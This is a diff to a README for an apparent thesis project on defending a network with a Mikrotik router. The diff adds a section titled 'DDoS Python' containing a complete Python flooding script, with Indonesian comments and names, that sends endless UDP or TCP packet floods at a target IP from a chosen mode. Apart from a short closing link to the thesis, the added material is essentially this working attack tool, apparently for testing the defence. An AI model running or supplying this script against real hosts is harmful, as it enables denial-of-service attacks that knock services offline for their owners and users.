@@ -25,6 +25,48 @@ The topology is: there are server / internal network to be defended by Mikrotik 
 
 ![Skripsi Image](/skripsi.png)
 
+### DDoS Python
+```
+import socket
+import random
+import threading
+ip = ''
+port = 80
+#port = random.randint(80,443)
+jp = 65500
+thread = 5
+#jp = jumlah paket
+def serang_udp(ip,port,jp,thread):
+    data = bytes(1024)
+    while True:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                for x in range(jp):
+                    for ulang in ip:
+                        s.sendto(data,(str(ulang),int(port)))
+            except:
+                print('gagal')
+def serang_tcp(ip,port,jp,thread):
+    data = bytes(1024)
+    print(f"tcp dijalankan pada{ip}:{port}")
+    while True:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((ip,port)) #hand shake
+                for x in range(jp):
+                  s.send(data)
+                  print(s.send(data))
+            except:
+                s.close()
+                #print('gagal')
+
+def pilih(c):
+    for i in range(thread):
+        th = threading.Thread(target=serang_tcp(ip,port,jp,i) if c==2 else serang_udp(ip,port,jp,i))
+        th.start()
+pilih(c=int(input("Masukan 1 untuk udp, 2 untuk tcp:\nInput: ")))
+```
+
 ## Explore This Project
 
 Take a Look @ My Lovely [Bachelor's Thesis](/skripsiHeru.pdf). This is not my enchanced version, the enchanced version is in english and more simple.
